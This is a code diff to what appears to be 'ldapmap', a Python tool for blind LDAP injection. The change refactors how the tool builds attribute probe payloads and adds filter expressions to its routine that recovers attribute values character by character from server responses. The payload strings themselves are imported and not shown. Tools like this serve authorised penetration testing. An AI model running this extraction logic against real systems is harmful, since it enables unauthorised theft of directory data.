@@ -3,7 +3,6 @@ import sys
 import requests
 
 from ldapmap_constants import (
-    ATTRIBUTE_TEST_TEMPLATES,
     CHARSET,
     COMMON_ATTRIBUTES,
     DETECTION_PAYLOADS,
@@ -11,15 +10,35 @@ from ldapmap_constants import (
     LOGIC_PAYLOADS,
 )
 from ldapmap_http import send_request
-from ldapmap_payloads import build_payload_data
+from ldapmap_payloads import (
+    LdapFilterNode,
+    build_attribute_probe_payloads,
+    build_payload_data,
+    parse_extraction_filter,
+)
 
 
-def _iter_attribute_payloads(attribute: str, value: str) -> tuple[str, ...]:
+def _iter_attribute_payloads(
+    attribute: str,
+    value: str,
+    exact: bool = False,
+    extraction_filters: tuple[LdapFilterNode, ...] | None = None,
+) -> tuple[str, ...]:
     """Return candidate payloads for an attribute/value probe."""
-    return tuple(
-        template.format(attr=attribute, value=value)
-        for template in ATTRIBUTE_TEST_TEMPLATES
+    return build_attribute_probe_payloads(
+        attribute=attribute,
+        value=value,
+        exact=exact,
+        extraction_filters=extraction_filters,
     )
+
+
+def _parse_extraction_filters(
+    extraction_filters: list[str] | None,
+) -> tuple[LdapFilterNode, ...] | None:
+    if not extraction_filters:
+        return None
+    return tuple(parse_extraction_filter(expr) for expr in extraction_filters)
 
 
 def _classify_attribute_payload(
@@ -52,14 +71,16 @@ def _discover_working_template_for_attribute(
     verbose: bool,
     use_json: bool,
     false_statuses: set[int] | None,
-) -> str | None:
+    extraction_filters: tuple[LdapFilterNode, ...] | None = None,
+) -> int | None:
     """
-    Pick a payload template that yields TRUE for the given *attribute*.
-
-    The returned template string is one of ATTRIBUTE_TEST_TEMPLATES.
+    Pick a payload variant index that yields TRUE for the given *attribute*.
     """
-    for template in ATTRIBUTE_TEST_TEMPLATES:
-        payload = template.format(attr=attribute, value="")
+    for idx, payload in enumerate(
+        _iter_attribute_payloads(
+            attribute, "", exact=False, extraction_filters=extraction_filters
+        )
+    ):
         classification, _ = _classify_attribute_payload(
             session,
             url,
@@ -73,7 +94,7 @@ def _discover_working_template_for_attribute(
             false_statuses,
         )
         if classification == "true":
-            return template
+            return idx
     return None
 
 
@@ -364,6 +385,7 @@ def extract_attribute(
     false_statuses: set[int] | None = None,
     exclude_value: str | None = None,
     find_all: bool = False,
+    extraction_filters: list[str] | None = None,
 ) -> str | list[str]:
     """
     Extract one or more values of *attribute* using LDAP wildcard probes.
@@ -375,7 +397,8 @@ def extract_attribute(
     print(f"\n[*] --- Extraction Phase: {attribute} ---")
     print(f"  [*] Extracting {attribute}: ", end="", flush=True)
     status_true_set = true_statuses if true_statuses is not None else {true_status}
-    working_template = _discover_working_template_for_attribute(
+    parsed_extraction_filters = _parse_extraction_filters(extraction_filters)
+    working_variant_idx = _discover_working_template_for_attribute(
         session,
         url,
         base_data,
@@ -386,15 +409,15 @@ def extract_attribute(
         verbose,
         use_json,
         false_statuses,
+        parsed_extraction_filters,
     )
-    if working_template is None:
+    if working_variant_idx is None:
         print(
             f"\n  [!] Could not determine a working injection template for attribute '{attribute}'.",
             file=sys.stderr,
         )
         return [] if find_all else ""
 
-    exact_template = working_template.replace("{value}*", "{value}")
     prefix_cache: dict[str, bool] = {}
     exact_cache: dict[str, bool] = {}
     children_cache: dict[str, list[str]] = {}
@@ -402,7 +425,9 @@ def extract_attribute(
     def matches_prefix(prefix: str) -> bool:
         if prefix in prefix_cache:
             return prefix_cache[prefix]
-        payload = working_template.format(attr=attribute, value=prefix)
+        payload = _iter_attribute_payloads(
+            attribute, prefix, exact=False, extraction_filters=parsed_extraction_filters
+        )[working_variant_idx]
         classification, resp = _classify_attribute_payload(
             session,
             url,
@@ -427,7 +452,9 @@ def extract_attribute(
     def is_exact_value(candidate: str) -> bool:
         if candidate in exact_cache:
             return exact_cache[candidate]
-        payload = exact_template.format(attr=attribute, value=candidate)
+        payload = _iter_attribute_payloads(
+            attribute, candidate, exact=True, extraction_filters=parsed_extraction_filters
+        )[working_variant_idx]
         classification, resp = _classify_attribute_payload(
             session,
             url,
